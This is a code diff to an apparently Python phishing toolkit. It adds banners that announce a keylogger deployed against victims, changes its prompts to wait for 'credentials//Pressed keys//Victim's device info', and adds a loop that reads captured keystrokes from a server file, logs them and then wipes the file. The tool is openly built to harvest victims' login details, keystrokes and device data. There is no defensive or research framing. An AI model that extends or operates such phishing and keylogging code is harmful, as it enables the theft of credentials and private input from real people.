@@ -65,6 +65,7 @@ def end():
               |/     / / / / / / /             \_   {1}ME !{2}  _)
                           {1}F I S H{2}                ~--___--~
                {0}NOW WITH LIVE VICTIM ATTACK INFORMATION ]
+          {0}A KEYLOGGER IS DEPLOYED FOR YOU, TO CAPTURE EVERY KEYSTROKE ]
 {1}[ {0} Some more phising pages have been added in script. For a better Attack]
 [ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(GREEN, END, CYAN))
 
@@ -150,10 +151,10 @@ def waitCreds():
 (  AnonUD4Y_  ~.<
  `=.____.="  `._\\
 
- [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION .
- [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, CITY, COUNTRY, AND MANY MORE STUFF.{0}'''.format(CYAN, END))
+ [{1}*{0}]{1} WE HAVE ALSO DEPLOYED A KEYLOGGER. .
+ [{1}*{0}]{1} YOU WILL GET VICTIM'S DEVICES INFO.{0}'''.format(CYAN, END))
 
-    print(" {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END))
+    print(" {0}[{1}*{0}]{1} Waiting for credentials//Pressed keys//Victim's device info... \n".format(RED, END))
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
@@ -189,6 +190,17 @@ def waitCreds():
                 log('======================================================================'.format(RED, END))
 
         creds.close()
+        
+        with open('Server/www/KeyloggerData.txt') as creds:
+            lines = creds.read().rstrip()
+            if len(lines) != 0:
+                log('______________________________________________________________________'.format(RED, END))
+                log(' {0}[ GETTING PRESSED KEYS ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
+                system('rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
+                log('______________________________________________________________________'.format(RED, END))
+                
+
+        creds.close()
 
 
 def runPEnv():
@@ -206,9 +218,10 @@ def runPEnv():
          '  .                     .     '          '     '  {1}v2.0{2}
                '  .  .  .  .  . '.    .'              '  .
                    '         '    '. '  {1}Updated_By--> AnonUD4Y_{2}
-                     '        {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]
-                       ' .  '
-                           '
+ _________________________________________________________________________________                  
+          {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]
+          {0}A KEYLOGGER WILL BE DEPLOYED FOR YOU, TO CAPTURE EVERY KEYSTROKE ]
+ _________________________________________________________________________________                      
                              {1}'''.format(GREEN, END, CYAN))
 
     for i in range(101):
@@ -370,4 +383,3 @@ if __name__ == "__main__":
     except KeyboardInterrupt: 
         end()
         exit(0)
-
